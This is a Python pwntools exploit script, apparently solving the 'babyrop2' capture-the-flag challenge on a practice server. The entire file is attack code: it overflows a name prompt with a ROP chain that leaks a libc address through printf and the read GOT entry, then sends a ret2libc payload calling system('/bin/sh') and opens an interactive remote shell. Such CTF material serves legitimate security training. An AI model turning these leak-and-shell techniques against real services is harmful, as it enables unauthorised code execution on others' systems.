from pwn import *

context.log_level = 'debug'
io = remote('node4.buuoj.cn', 28873)
elf = ELF('babyrop2')
libc = ELF('libc.so.6')
main_addr = elf.symbols['main']
printf_plt = elf.plt['printf']
read_got = elf.got['read']
pop_rdi_ret = 0x400733
pop_rsi_r15_ret = 0x400731
fmt_str = 0x400790

payload = cyclic(28) + p32(1) + cyclic(8) + p64(pop_rdi_ret) + p64(fmt_str) + p64(pop_rsi_r15_ret) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main_addr)
io.sendlineafter('What\'s your name? ', payload)
io.recvline()
libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.symbols['read']
log.success('libc_base: ' + hex(libc_base))

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
payload = cyclic(28) + p32(1) + cyclic(8) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter('What\'s your name? ', payload)
io.interactive()

